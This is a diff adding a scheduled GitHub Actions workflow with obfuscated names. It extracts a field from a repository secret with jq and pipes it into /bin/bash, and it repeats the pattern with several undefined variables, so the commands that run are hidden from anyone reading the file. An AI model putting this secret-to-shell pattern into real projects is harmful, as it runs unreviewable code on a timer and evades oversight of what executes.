@@ -1,0 +1,24 @@
+name: xiangsud
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangsud
+        env:
+          jbmd94167: ${{ secrets.jbmd94167 }}
+        run: |
+          echo $jbmd94167 | jq -r .ofp56 | /bin/bash
+          echo $gh21 | jq -r .wveh5212 | /bin/bash
+          echo $mdoow7828 | jq -r .rqzcy850 | /bin/bash
+          echo $oyfa4626 | jq -r .xhbra68 | /bin/bash
+          echo $hqeks54 | jq -r .c17576 | /bin/bash
+          echo $zfjq63 | jq -r .tuei2503 | /bin/bash
+          echo $odce63827 | jq -r .e0 | /bin/bash
+          echo $hsc638 | jq -r .z1 | /bin/bash
+          echo $byzw7419 | jq -r .ckd0642 | /bin/bash
+
